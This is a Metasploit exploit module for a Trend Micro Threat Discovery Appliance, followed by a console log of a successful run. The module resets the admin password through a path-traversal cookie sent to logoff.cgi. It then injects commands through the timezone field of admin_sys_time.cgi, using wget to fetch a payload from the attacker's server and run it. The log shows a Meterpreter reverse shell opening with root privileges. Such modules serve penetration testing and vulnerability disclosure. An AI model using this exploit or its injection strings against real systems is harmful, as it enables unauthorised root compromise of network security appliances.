##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Trend Micro Threat Discovery Appliance admin_sys_time.cgi Remote Command Execution',
      'Description' => %q{
          This module exploits two vulnerabilities the Trend Micro Threat Discovery Appliance.
          The first is an authentication bypass vulnerability via a file delete in logoff.cgi
          which resets the admin password back to 'admin' upon a reboot (CVE-2016-7552). 
          The second is a cmdi flaw using the timezone parameter in the admin_sys_time.cgi 
          interface (CVE-2016-7547). You have the option to use the authentication bypass or 
          not since it requires that the server is rebooted. This module has been tested on 
          version 2.6.1062r1 of the appliance.
      },
      'Author'       =>
        [
          'mr_me <steventhomasseeley@gmail.com>',    # vuln + msf
          'Roberto Suggi Liverani @malerisch',       # vuln + msf
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'URL', 'https://asciinema.org/a/112480'], # demo
          [ 'CVE', '2016-7552'],                      # auth bypass
          [ 'CVE', '2016-7547'],                      # cmdi
        ],
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86,
      'Privileged'  => true,
      'Payload'        =>
        {
          'DisableNops' => true,
        },
      'Targets'     =>
        [
          [ 'Trend Micro Threat Discovery Appliance 2.6.1062r1', {} ]
        ],
      'DefaultOptions' =>
        {
          'SSL' => true
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Apr 10 2017'))

    register_options(
      [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [true, 'The target URI', '/']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'admin']),
        OptPort.new('SRVPORT', [ true, 'The daemon port to listen on', 1337 ]),
        OptBool.new('AUTHBYPASS', [ true, 'Bypass the authentication', true ]),

      ], self.class)
  end

  def check
    if do_login
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'cgi-bin/about.cgi'),
        'cookie' => @cookie,
        'method' =>  'GET',
        }, 1)
      if res and res.code == 200 and res.body =~ /About Trend Micro/
        version = "#{$1}" if res.body =~ /var ver_str = new String\("(.*)"\)/
        case version
        when /2.6.1062/
          return Exploit::CheckCode::Vulnerable
        end
      end
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    if datastore['AUTHBYPASS']
      print_status("Bypassing authentication...")
      if reset_password
        print_good("The password has been reset!")
        print_status("Waiting for the reboot...")
        pwn_after_reboot
      end
    else
      if do_login
        pwn
      else
        fail_with(Failure::NoAccess, "Authentication failed")
      end
    end
  end

  def reset_password
    c = "session_id=../../../opt/TrendMicro/MinorityReport/etc/igsa.conf"
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cgi-bin/logoff.cgi'),
      'method' =>  'GET',
      'cookie' => c,
      })

    if res and res.code == 200 and res.headers.to_s =~ /Backtrace/
      return true
    end
    return false
  end

  def pwn
    start_http_server
    print_good("Logged in")
    download_exec
  end

  def pwn_after_reboot
    @rebooted = false
    while !@rebooted
      if do_login
        @rebooted = true
        pwn
      end
    end
  end

  def on_request_uri(cli, request)
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn't ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  def start_http_server
    @pl = generate_payload_exe
    @elf_sent = false

    downfile = rand_text_alpha(8+rand(8))
    resource_uri = '/' + downfile

    # do not use SSL for the attacking web server
    if datastore['SSL']
      ssl_restore = true
      datastore['SSL'] = false
    end

    if (datastore['SRVHOST'] == "0.0.0.0" or datastore['SRVHOST'] == "::")
      srv_host = datastore['URIHOST'] || Rex::Socket.source_address(rhost)
    else
      srv_host = datastore['SRVHOST']
    end

    @service_url = 'http://' + srv_host + ':' + datastore['SRVPORT'].to_s + resource_uri
    service_url_payload = srv_host + resource_uri

    print_status("#{rhost}:#{rport} - Starting up our web service on #{@service_url} ...")
    start_service({'Uri' => {
      'Proc' => Proc.new { |cli, req|
        on_request_uri(cli, req)
      },
      'Path' => resource_uri
    }})

    datastore['SSL'] = true if ssl_restore
    connect
  end

  def exec(cmd)
    send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'cgi-bin/admin_sys_time.cgi'),
      'cookie' => @cookie,
      'method' =>  'POST',
        'vars_post' => {
          'act'      => 'save',
          'timezone' => cmd,
        }
      }, 1)
  end

  def download_exec
    @bd = rand_text_alpha(8+rand(8))
    register_file_for_cleanup("/tmp/#{@bd}")
    exec("|`wget #{@service_url} -O /tmp/#{@bd}`")
    exec("|`chmod 755 /tmp/#{@bd}`")
    exec("|`/tmp/#{@bd}`")

    # we need to delay, for the stager
    select(nil, nil, nil, 5)
  end

  def do_login

    begin
      login = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'cgi-bin/logon.cgi'),
        'method' =>  'POST',
          'vars_post' => {
            'passwd'         => datastore['PASSWORD'],
            'isCookieEnable' => 1,
          }
        })

    # these are needed due to the reboot
    rescue Rex::ConnectionRefused
      return false
    rescue Rex::ConnectionTimeout
      return false
    end
    if login and login.code == 200 and login.body =~ /frame\.cgi/
      @cookie = "session_id=#{$1};" if login.get_cookies =~ /session_id=(.*);/
      return true
    end
    return false
  end
end
=begin
saturn:metasploit-framework mr_me$ ./msfconsole -qr scripts/trend.rc 
[*] Processing scripts/trend.rc for ERB directives.
resource (scripts/trend.rc)> use exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi
resource (scripts/trend.rc)> set RHOST 192.168.100.2
RHOST => 192.168.100.2
resource (scripts/trend.rc)> set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
resource (scripts/trend.rc)> set LHOST 192.168.100.13
LHOST => 192.168.100.13
resource (scripts/trend.rc)> exploit
[*] Exploit running as background job.

[*] Started reverse TCP handler on 192.168.100.13:4444 
[*] Bypassing authentication...
msf exploit(trendmicro_threat_discovery_admin_sys_time_cmdi) > 
[+] The password has been reset!
[*] Waiting for the reboot...
[*] 192.168.100.2:443 - Starting up our web service on http://192.168.100.13:1337/nnDBuOUMuKnxP ...
[*] Using URL: http://0.0.0.0:1337/nnDBuOUMuKnxP
[*] Local IP: http://192.168.100.13:1337/nnDBuOUMuKnxP
[+] Logged in
[*] 192.168.100.2:443 - Sending the payload to the server...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 192.168.100.2
[*] Meterpreter session 1 opened (192.168.100.13:4444 -> 192.168.100.2:46140) at 2016-09-23 14:59:08 -0500
[+] Deleted /tmp/rpNDXQZTB
[*] Server stopped.

msf exploit(trendmicro_threat_discovery_admin_sys_time_cmdi) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 3846 created.
Channel 1 created.


BusyBox v1.00 (2010.10.13-06:52+0000) Built-in shell (ash)
Enter 'help' for a list of built-in commands.

/bin/sh: can't access tty; job control turned off
/opt/TrendMicro/MinorityReport/www/cgi-bin # id
id
uid=0(root) gid=0(root)
/opt/TrendMicro/MinorityReport/www/cgi-bin #
=end